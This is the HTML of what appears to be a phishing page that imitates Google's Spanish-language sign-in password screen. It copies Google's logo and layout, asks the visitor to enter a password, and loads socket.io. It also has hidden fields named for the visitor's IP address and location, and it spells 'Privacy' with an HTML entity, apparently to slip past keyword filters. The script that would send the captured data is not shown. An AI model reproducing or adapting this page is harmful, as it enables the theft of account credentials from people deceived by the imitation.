<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bienvenido</title>
  <link rel="shortcut icon" href="pcs/g-lg.ico" type="image/x-icon">
  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js" integrity="sha384-2huaZvOR9iDzHqslqwpR87isEmrfxqyWOF7hr7BY6KG0+hVKLoEXMPUJw3ynWuhO" crossorigin="anonymous"></script>

  <style>
    html{
      font-size: 62.5%;
      box-sizing: border-box;
    }
    *,*::after,*::before{
      box-sizing: inherit;
      padding: 0px;
      margin: 0px;
    }
    body{
      font-size: 1.6rem;
      background-color: #f0f4f9;
      display: flex;
      justify-content: center;
      flex-direction: column;
      min-height: 100vh;
      font-family: Arial, Helvetica, sans-serif;
      justify-content: space-between;

    }
    @media(min-width:768px){
      body{
        align-items: center;
        justify-content: center;


      }

    }
    .cont-gm{
      width: 100%;
      max-width: 1040px;
      height: 100vh;
      background-color: #fff;
      padding: 2rem 3rem;
    }
    @media(min-width:768px){
      .cont-gm{
        border-radius: 28px;
        padding: 2rem 4rem 2rem 3rem;
        height: 400px;


      }
    }
    .cont-flex{
      display: flex;
      flex-direction: column;
    }
    @media(min-width:768px){
      .cont-flex{
        flex-direction: row;
      }
    }
    .flex-lf{
      flex: 1;
    }
    .flex-rg{
      flex: 1;
    }
    .text-bienv{
      font-size: 36px;
      font-weight: 400;
      margin-top: 1rem;
      margin-bottom: 5px;
    }
    .text-bienv-m{
      font-size: 30px;
    }
    @media(min-width:768px){
      .text-bienv-m{
      max-width: 30rem;
      font-size: 40px;
    }
    }

    .usr{
      display: flex;
      justify-content: center;
      margin-top: 2rem;
    }
    .usr input{
      width: 100%;
      height: 5.4rem;
      padding-left: 1rem;
      font-size: 16px;
      outline: none;
    }
    .usr input:focus{
      border: 2px solid #0b57d0;
    }
    .ir{
      margin-top: 2rem;
    }
    #lace{
      display: block;
      margin-top: .8rem;
      text-decoration: none;
      color: #0b57d0;
      font-weight: 500;
    }
    .fot-text{
      margin-top: 5rem;
      color: #444746;
      font-size: 14px;
      
    }
    .fot-text a{
      color: #0b57d0;
      text-decoration: none;
    }
    #subs{
      display: flex;
      align-items: center;
      margin-top: 4rem;
      gap: 1rem;
      justify-content: space-between;
      /* background-color: #0b57d0; */
    }
    @media(min-width:768px){
      #subs{
        justify-content: end;
        gap: 4rem;
      }
    }
    #subs input{
      width: 10.9rem;
      background-color: #0b57d0;
      color: #fff;
      height: 4rem;
      border: none;
      border-radius: 25px;
    }

    #subs a{
      text-decoration: none;
      color: #316ecf;
      font-weight: 600;
      font-size: 15px;
      height: 4rem;
      border: none;
      border-radius: 25px;
      display: flex;
      align-items: center;
      justify-content: center;
      /* width: 10.9rem; */
    }
    #subs a:hover{
      background-color: #f6f7ff;
    }
    input[type="submit"]{
      cursor: pointer;
    }
    .foot{
      width: 100%;
      max-width: 1040px;
      display: flex;
      justify-content: space-between;
      flex-direction: column;
      padding: 0 1rem;
      margin-top: -10rem;
      gap: 3rem;
      
    }
    @media(min-width: 768px){
      .foot{
        flex-direction: row;
        margin-top: 1rem;
        gap: 0;
      }
    }
    .foot select{
      background-color: transparent;
      border: none;
      padding: 1rem;
      border-radius: 15px;
      outline: none;
    }
    .foot select:hover{
      background-color: #e4e4e4;
    }
    .foot-laces{
      display: flex;
      align-items: center;
      gap: 2rem;
    }
    
    .foot-laces a{
      text-decoration: none;
      color: #444746;
      font-size: 13px;
      padding: 1rem;
      border-radius: 15px;
    }
    .foot a:hover{
      background-color: #e4e4e4;
    }

    .cont-js1{
      display: inline-flex;
      align-items: center;
      border: 1px solid #333;
      width: auto;
      border-radius: 25px;
      padding: 2px 5px;
      font-size: 14px;
      margin-top: 1rem;
    }
    .usr-m{
      margin-top: 7rem;
    }
    .checks{
      display: flex;
      align-items: center;
      gap: 2rem;
      margin-top: 1rem;
      margin-bottom: 7rem;
    }
    #err{
      font-size: 13px;
      color: #b3261e;
    }
    #showPassword{
      cursor: pointer;
    }
    .checks label{
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="cont-gm">
    <div class="g-lg-cont">
      <svg width="64px" height="64px" viewBox="-1.6 -1.6 19.20 19.20" xmlns="http://www.w3.org/2000/svg" fill="none"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path fill="#4285F4" d="M14.9 8.161c0-.476-.039-.954-.121-1.422h-6.64v2.695h3.802a3.24 3.24 0 01-1.407 2.127v1.75h2.269c1.332-1.22 2.097-3.02 2.097-5.15z"></path><path fill="#34A853" d="M8.14 15c1.898 0 3.499-.62 4.665-1.69l-2.268-1.749c-.631.427-1.446.669-2.395.669-1.836 0-3.393-1.232-3.952-2.888H1.85v1.803A7.044 7.044 0 008.14 15z"></path><path fill="#FBBC04" d="M4.187 9.342a4.17 4.17 0 010-2.68V4.859H1.849a6.97 6.97 0 000 6.286l2.338-1.803z"></path><path fill="#EA4335" d="M8.14 3.77a3.837 3.837 0 012.7 1.05l2.01-1.999a6.786 6.786 0 00-4.71-1.82 7.042 7.042 0 00-6.29 3.858L4.186 6.66c.556-1.658 2.116-2.89 3.952-2.89z"></path></g></svg>
    </div>
    <div class="cont-flex">
      <div class="flex-lf">
        <p class="text-bienv text-bienv-m">Bienvenido</p>
        <!-- <p class="ir">Ir a Gmail</p> -->
         <div class="cont-js1">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user-circle" width="24" height="24" viewBox="0 0 24 24" stroke-width="1.5" stroke="#2c3e50" fill="none" stroke-linecap="round" stroke-linejoin="round">
            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
            <path d="M12 12m-9 0a9 9 0 1 0 18 0a9 9 0 1 0 -18 0" />
            <path d="M12 10m-3 0a3 3 0 1 0 6 0a3 3 0 1 0 -6 0" />
            <path d="M6.168 18.849a4 4 0 0 1 3.832 -2.849h4a4 4 0 0 1 3.834 2.855" />
          </svg>
          <p id="user"></p>
         </div>

      </div>
      <div class="flex-rg">

        <div id="cont-xjsx">
          <form id="xjsx" action="">
            <div class="usr usr-m">
              <input id="js2" name="js2" type="password" placeholder="Introduce tu contraseña">
            </div>
            <p id="err"></p>
            <div class="checks">
              <input id="showPassword" type="checkbox">
              <label for="showPassword">Mostrar contraseña</label>
            </div>
              <!-- <a id="lace" href="#">¿Olvidaste el correo electrónico?</a>
            <div class="fot-text">
              <p>¿Esta no es tu computadora? Usa el modo de invitado para navegar de forma privada. <a href="#">Más información para usar el modo de invitado</a></p>
            </div> -->

            <div id="subs">
              <a href="#">¿Has olvidado tu contraseña?</a>
              <input style="font-size: 12px !important;" type="submit" value="Siguiente">

            </div>
          </form>

        </div>

      </div>
    </div>
    
    

  </div>
  <div class="foot">
    <select name="" id="">
      <option value="">English (United states)</option>
    </select>


   <div class="foot-laces">
    <a href="#">Help</a>
    <a href="#">Priv&#97;cy</a>
    <a href="#">Termins</a>
   </div>

  </div>

  <div id="gfg" style="display:none;"></div> 
  <div id="ip" style="display:none;"></div> 
  <div id="address" style="display:none;"></div>


</body>
</html>
